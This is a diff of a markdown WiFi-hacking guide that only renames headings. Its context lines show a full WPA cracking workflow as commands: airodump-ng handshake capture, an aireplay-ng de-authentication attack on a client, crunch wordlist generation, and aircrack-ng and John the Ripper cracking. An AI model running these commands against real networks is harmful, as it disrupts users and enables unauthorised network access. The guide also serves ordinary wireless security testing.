@@ -294,7 +294,7 @@ airodump-ng --bssid {router_MAc_add} --channel {channel_no.} --write {file_name_
 >[!NOTE]\
 >Handshake is captured only when new client is connected. we can't wait so use de-authentication attack `parlelly`.
 
-> ### De-authentication attack
+> # De-authentication attack
 ```bash
 aireplay-ng --deauth {no_of_deauth_packet} -a {router_MAC_add} -c {target_d_MAc_add} wlan0
 ```
@@ -314,8 +314,9 @@ crunch {key_length Ex: 6 8} {char_used Ex: abc12} -o {.txt} -t {patter Ex: a@@@@
 aircrack-ng {.cap} -w {Wordlist.txt}
 ```
 ---
-## WPA-key Cracking using `John-the-riper` tool
-> ### Convert `.cap` to `.hccap` format
+# Crack Password Using `Handshake file`
+
+> ### `.cap` to `.hccap`
 ```bash
 aircrack-ng {.cap} -J {extension_name_not_required}
 ```
@@ -324,7 +325,7 @@ aircrack-ng {.cap} -J {extension_name_not_required}
 hccap2john {.hccap} > {.txt}
 ```
 
-> ### passward cracking using `John-the-riper` package
+> ### Crack Password
 ```bash
 john {.txt}
 ```
